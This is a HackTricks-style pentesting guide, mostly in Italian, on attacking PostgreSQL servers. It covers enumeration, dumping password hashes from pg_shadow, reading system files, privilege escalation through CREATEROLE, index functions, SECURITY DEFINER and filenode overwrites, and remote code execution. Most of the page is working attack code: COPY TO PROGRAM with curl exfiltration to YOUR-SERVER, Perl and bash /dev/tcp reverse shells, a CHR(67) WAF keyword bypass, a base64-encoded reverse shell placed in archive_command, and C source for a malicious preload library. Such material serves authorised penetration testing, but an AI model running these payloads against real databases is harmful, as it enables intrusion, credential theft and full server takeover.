# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Informazioni di base**

**PostgreSQL** è descritto come un **sistema di database object-relational** che è **open source**. Questo sistema non solo utilizza il linguaggio SQL ma lo estende con funzionalità aggiuntive. Le sue capacità gli consentono di gestire un'ampia gamma di tipi di dati e operazioni, rendendolo una scelta versatile per sviluppatori e organizzazioni.

**Porta predefinita:** 5432, e se questa porta è già in uso sembra che PostgreSQL userà la porta successiva (probabilmente 5433) che non è in uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connessione e Enum di base
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Se eseguendo **`\list`** trovi un database chiamato **`rdsadmin`** sai di essere all'interno di un database **AWS postgresql**.

Per maggiori informazioni su **come abusare di un database PostgreSQL** consulta:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Enumerazione automatica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Secondo [**this research**](https://www.exploit-db.com/papers/13084), quando un tentativo di connessione fallisce, `dblink` genera un'eccezione `sqlclient_unable_to_establish_sqlconnection` includendo una spiegazione dell'errore. Esempi di questi dettagli sono elencati di seguito.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host non raggiungibile

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port è chiusa
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Porta è aperta
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
o
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- La porta è aperta o filtrata
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Nelle funzioni PL/pgSQL, attualmente non è possibile ottenere i dettagli delle eccezioni. Tuttavia, se hai accesso diretto al server PostgreSQL, puoi recuperare le informazioni necessarie. Se estrarre usernames e passwords dalle tabelle di sistema non è fattibile, puoi prendere in considerazione l'utilizzo del metodo di attacco con wordlist discusso nella sezione precedente, poiché potrebbe dare risultati positivi.

## Enumerazione dei privilegi

### Ruoli

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Il ruolo ha privilegi di superuser                                                                                                                   |
| rolinherit     | Il ruolo eredita automaticamente i privilegi dei ruoli di cui è membro                                                                              |
| rolcreaterole  | Il ruolo può creare altri ruoli                                                                                                                      |
| rolcreatedb    | Il ruolo può creare database                                                                                                                         |
| rolcanlogin    | Il ruolo può accedere. Cioè, questo ruolo può essere utilizzato come identificatore di autorizzazione iniziale della sessione                         |
| rolreplication | Il ruolo è un ruolo di replica. Un ruolo di replica può iniziare connessioni di replica e creare o eliminare replication slots.                       |
| rolconnlimit   | Per i ruoli che possono accedere, imposta il numero massimo di connessioni concorrenti che questo ruolo può stabilire. -1 significa nessun limite.    |
| rolpassword    | Non è la password (legge sempre `********`)                                                                                                          |
| rolvaliduntil  | Data di scadenza della password (usata solo per l'autenticazione tramite password); null se nessuna scadenza                                         |
| rolbypassrls   | Il ruolo bypassa ogni policy di row-level security, vedi [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) per maggiori informazioni. |
| rolconfig      | Default specifici del ruolo per le variabili di configurazione a runtime                                                                             |
| oid            | ID del ruolo                                                                                                                                         |

#### Gruppi interessanti

- Se sei membro di **`pg_execute_server_program`** puoi **eseguire** programmi
- Se sei membro di **`pg_read_server_files`** puoi **leggere** file
- Se sei membro di **`pg_write_server_files`** puoi **scrivere** file

> [!TIP]
> Nota che in Postgres un **user**, un **group** e un **role** sono la **stessa cosa**. Dipende solo da **come lo usi** e se gli **consenti di effettuare il login**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelle
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funzioni
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Azioni sul file-system

### Leggere directory e file

Da questo [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) i membri del gruppo definito **`DEFAULT_ROLE_READ_SERVER_FILES`** (chiamato **`pg_read_server_files`**) e gli **super users** possono usare il metodo **`COPY`** su qualsiasi percorso (dai un'occhiata a `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Ricorda che se non sei super user ma hai i permessi **CREATEROLE** puoi **renderti membro di quel gruppo:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Esistono **altre funzioni di postgres** che possono essere usate per **leggere un file o elencare una directory**. Solo i **superusers** e gli **utenti con permessi espliciti** possono usarle:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puoi trovare **altre funzioni** in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Scrittura semplice di file

Solo **super users** e i membri di **`pg_write_server_files`** possono usare copy per scrivere file.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Ricorda che se non sei superuser ma hai il permesso **`CREATEROLE`** puoi **aggiungerti a quel gruppo:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ricorda che COPY non può gestire caratteri di newline, pertanto anche se stai usando un payload base64 devi inviare una singola riga (one-liner).\
Una limitazione molto importante di questa tecnica è che **`copy` non può essere usato per scrivere file binari poiché modifica alcuni valori binari.**

### **Upload di file binari**

Tuttavia, esistono **altre tecniche per caricare file binari di grandi dimensioni:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Aggiornamento dei dati delle tabelle PostgreSQL tramite scrittura su file locale

Se hai i permessi necessari per leggere e scrivere i file del server PostgreSQL, puoi aggiornare qualsiasi tabella sul server sovrascrivendo il filenode associato in [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Passaggi necessari:

1.  Ottenere la directory dei dati di PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** Se non riesci a recuperare il percorso della data directory corrente dalle impostazioni, puoi interrogare la versione principale di PostgreSQL con la query `SELECT version()` e provare a forzare il percorso. Percorsi comuni della data directory su installazioni Unix di PostgreSQL sono `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nome di cluster comune è `main`.

2.  Ottenere un percorso relativo al filenode associato alla tabella di destinazione

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Questa query dovrebbe restituire qualcosa come `base/3/1337`. Il percorso completo su disco sarà `$DATA_DIRECTORY/base/3/1337`, cioè `/var/lib/postgresql/13/main/base/3/1337`.

3.  Scaricare il filenode tramite le funzioni `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Ottenere il tipo di dato associato alla tabella di destinazione

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Usa il [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) per [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); imposta tutti i flag booleani `rol*` a 1 per ottenere permessi completi.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ricarica il filenode modificato tramite le funzioni `lo_*`, e sovrascrivi il file originale sul disco

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opzionalmente)_ Pulisci la cache in memoria della tabella eseguendo una query SQL pesante

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Ora dovresti vedere i valori della tabella aggiornati in PostgreSQL.

Puoi anche diventare superadmin modificando la tabella `pg_authid`. **Vedi** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Da[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo i **superuser** e i membri del gruppo **`pg_execute_server_program`** possono usare copy per RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Esempio da eseguire:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Ricorda che se non sei super user ma hai i permessi **`CREATEROLE`** puoi **renderti membro di quel gruppo:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Or use the `multi/postgres/postgres_copy_from_program_cmd_exec` module from **metasploit**.\
More information about this vulnerability [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). While reported as CVE-2019-9193, Postges declared this was a [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass dei filtri di parole chiave/WAF per raggiungere COPY PROGRAM

In contesti di SQLi con query stacked, una WAF può rimuovere o bloccare la keyword letterale `COPY`. Puoi costruire dinamicamente l'istruzione ed eseguirla all'interno di un blocco PL/pgSQL DO. Per esempio, genera la lettera iniziale C con `CHR(67)` per bypassare filtri semplicistici e EXECUTE il comando assemblato:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Questo pattern evita il filtraggio statico per parola chiave e permette comunque l'esecuzione di comandi del sistema operativo tramite `COPY ... PROGRAM`. È particolarmente utile quando l'applicazione stampa gli errori SQL e permette query impilate.

### RCE con i linguaggi PostgreSQL


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE con le estensioni PostgreSQL

Una volta che hai **imparato** dal post precedente **come caricare file binari** puoi provare a ottenere **RCE caricando un'estensione postgresql e caricandola**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE tramite file di configurazione PostgreSQL

> [!TIP]
> I seguenti vettori di RCE sono particolarmente utili in contesti SQLi restrittivi, poiché tutti i passaggi possono essere eseguiti tramite SELECT nidificati

Il **file di configurazione** di PostgreSQL è **scrivibile** dall'**utente postgres**, che è quello che esegue il database; quindi come **superuser** puoi scrivere file nel filesystem e di conseguenza puoi **sovrascrivere questo file.**

![](<../images/image (322).png>)

#### **RCE con ssl_passphrase_command**

Ulteriori informazioni [su questa tecnica qui](https://pulsesecurity.co.nz/articles/postgres-sqli).

Il file di configurazione ha alcuni attributi interessanti che possono portare a RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Percorso della chiave privata del database
- `ssl_passphrase_command = ''` Se il file privato è protetto da password (criptato) postgresql **eseguirà il comando indicato in questo attributo**.
- `ssl_passphrase_command_supports_reload = off` **Se** questo attributo è **on** il **comando** eseguito se la chiave è protetta da password **verrà eseguito** quando `pg_reload_conf()` verrà **eseguito**.

Quindi, un attaccante dovrà:

1. **Dump della chiave privata** dal server
2. **Criptare** la chiave privata scaricata:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sovrascrivere**
4. **Dump** della corrente postgresql **configurazione**
5. **Sovrascrivere** la **configurazione** con la configurazione che contiene gli attributi menzionati:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Eseguire `pg_reload_conf()`

Durante i test ho notato che questo funziona solo se il **file della chiave privata ha permessi 640**, è **di proprietà di root** e del **gruppo ssl-cert o postgres** (così l'utente postgres può leggerlo), e si trova in _/var/lib/postgresql/12/main_.

#### **RCE con archive_command**

Per ulteriori [informazioni su questa configurazione e su WAL qui](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3).

Un altro attributo nel file di configurazione sfruttabile è `archive_command`.

Perché questo funzioni, l'impostazione `archive_mode` deve essere `'on'` o `'always'`. Se è così, potremmo sovrascrivere il comando in `archive_command` e forzare la sua esecuzione tramite le operazioni WAL (write-ahead logging).

I passi generali sono:

1. Verificare se archive mode è abilitato: `SELECT current_setting('archive_mode')`
2. Sovrascrivere `archive_command` con il payload. Ad esempio, una reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ricaricare la configurazione: `SELECT pg_reload_conf()`
4. Forzare l'esecuzione dell'operazione WAL, che chiamerà l'archive command: `SELECT pg_switch_wal()` oppure `SELECT pg_switch_xlog()` per alcune versioni di Postgres

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Quando sono necessarie scritture multi-linea (per esempio, per impostare più GUC), usa PostgreSQL Large Objects per leggere e sovrascrivere interamente la config da SQL. Questo approccio è ideale in contesti SQLi dove `COPY` non può gestire newline o scritture binary-safe.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Questo permette l'esecuzione affidabile di comandi del sistema operativo tramite `archive_command` come utente `postgres`, a condizione che `archive_mode` sia abilitato. In pratica, impostare un basso `archive_timeout` può causare invocazioni rapide senza richiedere uno switch WAL esplicito.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- librerie che verranno caricate dal server PostgreSQL alla connessione del client.
- `dynamic_library_path` -- elenco di directory in cui il server PostgreSQL cercherà le librerie.

Possiamo impostare il valore di `dynamic_library_path` su una directory scrivibile dall'utente `postgres` che esegue il database, ad esempio la directory `/tmp/`, e caricare lì un oggetto `.so` malevolo. Successivamente, forzeremo il server PostgreSQL a caricare la libreria appena caricata includendola nella variabile `session_preload_libraries`.

The attack steps are:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Ruoli che possiedono il privilegio **`CREATEROLE`** possono **concedere o revocare l'appartenenza a qualsiasi ruolo** che **non** è un **superuser**._

Quindi, se hai il permesso **`CREATEROLE`** potresti concederti accesso ad altri **ruoli** (che non sono superuser) che possono darti la possibilità di leggere e scrivere file ed eseguire comandi:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifica Password

Gli utenti con questo ruolo possono anche **cambiare** le **passwords** di altri **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

È piuttosto comune trovare che **gli utenti locali possono accedere a PostgreSQL senza fornire alcuna password**. Pertanto, una volta ottenuti **i permessi per eseguire codice** puoi abusare di questi permessi per ottenere il ruolo **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Questo è generalmente possibile a causa delle seguenti righe nel file **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) viene spiegato come sia stato possibile ottenere una **privesc** in Postgres GCP abusando del privilegio **ALTER TABLE** concesso all'utente.

Quando provi a **rendere un altro utente proprietario di una tabella** dovresti ricevere un **errore** che lo impedisce, ma a quanto pare GCP ha dato quell'**opzione all'utente postgres non-superuser** in GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Unendo questa idea al fatto che quando i comandi **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) vengono eseguiti su una **tabella con una index function**, la **function** viene **chiamata** come parte del comando con i permessi del **proprietario della tabella**. È possibile creare un index con una function e dare i permessi di owner a un **super user** su quella tabella, quindi eseguire ANALYZE sulla tabella con la function malevola che sarà in grado di eseguire comandi perché utilizza i privilegi del proprietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Inizia creando una nuova tabella.
2. Inserisci del contenuto irrilevante nella tabella per fornire dati alla funzione di indice.
3. Sviluppa una funzione di indice malevola che contiene un payload per l'esecuzione di codice, consentendo l'esecuzione di comandi non autorizzati.
4. ALTER il proprietario della tabella impostandolo su "cloudsqladmin", che è il ruolo di superutente di GCP utilizzato esclusivamente da Cloud SQL per gestire e mantenere il database.
5. Esegui un'operazione ANALYZE sulla tabella. Questa azione obbliga il motore PostgreSQL a cambiare al contesto utente del proprietario della tabella, "cloudsqladmin". Di conseguenza, la funzione di indice malevola viene chiamata con i permessi di "cloudsqladmin", consentendo così l'esecuzione del comando shell precedentemente non autorizzato.

In PostgreSQL, questo flusso assomiglia a quanto segue:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Poi, la tabella `shell_commands_results` conterrà l'output del codice eseguito:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Login locale

Alcune istanze di postgresql mal configurate potrebbero consentire il login di qualsiasi utente locale; è possibile effettuare il login da 127.0.0.1 usando la funzione **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Nota che per la query precedente per funzionare **la funzione `dblink` deve esistere**. Se non esiste puoi provare a crearla con
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Se hai la password di un utente con privilegi maggiori, ma l'utente non è autorizzato a connettersi da un IP esterno puoi usare la seguente funzione per eseguire query come quell'utente:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
È possibile verificare se questa funzione esiste con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Funzione definita personalizzata con** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters sono riusciti a privesc all'interno di un'istanza postgres fornita da IBM, perché hanno **trovato questa funzione con il flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) a function with **SECURITY DEFINER viene eseguita** con i privilegi dell'**utente che la possiede**. Pertanto, se la funzione è **vulnerabile a SQL Injection** o sta eseguendo alcune **azioni privilegiate con params controllati dall'attaccante**, potrebbe essere abusata per **escalate privileges inside postgres**.

Nella riga 4 del codice precedente puoi vedere che la funzione ha il flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
E poi **esegui comandi**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** è un **linguaggio di programmazione completo** che offre un controllo procedurale maggiore rispetto a SQL. Permette l'uso di **loop** e altre **strutture di controllo** per migliorare la logica del programma. Inoltre, le **istruzioni SQL** e i **trigger** possono invocare funzioni create usando il **linguaggio PL/pgSQL**. Questa integrazione consente un approccio più completo e versatile alla programmazione e all'automazione del database.\
**Puoi abusare di questo linguaggio per chiedere a PostgreSQL di brute-force le credenziali degli utenti.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Il seguente vettore di privesc è particolarmente utile in contesti SQLi limitati, poiché tutti i passaggi possono essere eseguiti tramite SELECT annidate

Se puoi **leggere e scrivere i file del server PostgreSQL**, puoi **diventare superuser** sovrascrivendo il filenode su disco di PostgreSQL, associato alla tabella interna `pg_authid`.

Leggi di più su **questa tecnica** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

I passaggi dell'attacco sono:

1. Ottieni la directory dei dati di PostgreSQL
2. Ottieni un percorso relativo al filenode associato alla tabella `pg_authid`
3. Scarica il filenode tramite le funzioni `lo_*`
4. Ottieni il tipo di dato associato alla tabella `pg_authid`
